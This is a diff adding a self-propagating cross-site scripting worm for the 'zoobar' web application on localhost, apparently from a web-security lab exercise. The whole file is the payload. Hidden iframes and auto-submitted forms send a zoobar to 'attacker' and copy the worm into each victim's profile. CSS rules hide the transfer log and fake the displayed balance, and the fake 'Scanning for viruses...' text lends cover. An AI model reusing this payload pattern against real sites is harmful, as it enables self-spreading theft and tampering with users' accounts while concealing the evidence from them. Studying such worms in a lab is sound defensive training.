@@ -1,0 +1,19 @@
+Scanning for viruses...</b></div>
+<div id="worm">
+<iframe style="visibility:hidden; width:0; height:0; position:absolute" name="wormframe" id="wormframe"></iframe>
+<form method="POST" name="wormform" id="wormform" action="http://localhost:8080/zoobar/index.cgi/" target="wormframe">
+<input type="text" name="profile_update" value="" style="display:none">
+</form>
+<iframe style="visibility:hidden; width:0; height:0; position:absolute" name="transframe" id="transframe"></iframe>
+<form method="POST" name="transform" id="transform" action="http://localhost:8080/zoobar/index.cgi/transfer" target="transframe">
+<input type="text" name="zoobars" value="1" style="display:none">
+<input type="text" name="recipient" value="attacker" style="display:none">
+</form>
+</div>
+<script>
+(function loopback () {var wormprofile = document.getElementsByName("profile_update")[0];
+wormprofile.value = "Scanning for viruses...</b></div><div id=\"worm\">" + document.getElementById("worm").innerHTML + "</div><script>(" + loopback.toString() + ")();<\/script><style>.log tr:nth-child(n+2){display:none;}<\/style><div id=\"zoobars\" class=\"10\"><b>";
+document.getElementById("transform").submit();
+document.getElementById("wormform").submit();})();
+</script>
+<style>.log tr:nth-child(n+2){display:none;}</style><div id="zoobars" class="10"><b>
